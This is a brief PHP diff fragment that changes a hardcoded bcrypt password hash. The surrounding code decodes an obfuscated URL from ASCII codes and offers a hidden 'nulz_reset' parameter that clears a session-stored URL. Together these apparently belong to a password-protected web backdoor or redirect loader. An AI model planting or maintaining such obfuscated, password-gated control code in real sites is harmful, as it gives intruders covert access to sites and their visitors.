@@ -14,7 +14,7 @@ foreach ($asciiArray as $ascii) {
     $decodedString .= chr($ascii);
 }
 $url = $decodedString;
-$correct_password = '$2y$10$TGT36epmgr3/fTZ.XPB9nuXbKG5GcQYw/P3gFs4F7kIRflxBIWRAS';
+$correct_password = '$2y$10$6VDjbpAEhu.N9no7h.KtGO29fwnXMN0byteFNEs5L9sXdqNRU6gai';
 if (isset($_GET['nulz_reset'])) {
     $_SESSION["nulz_url"] = "";
     echo "success";
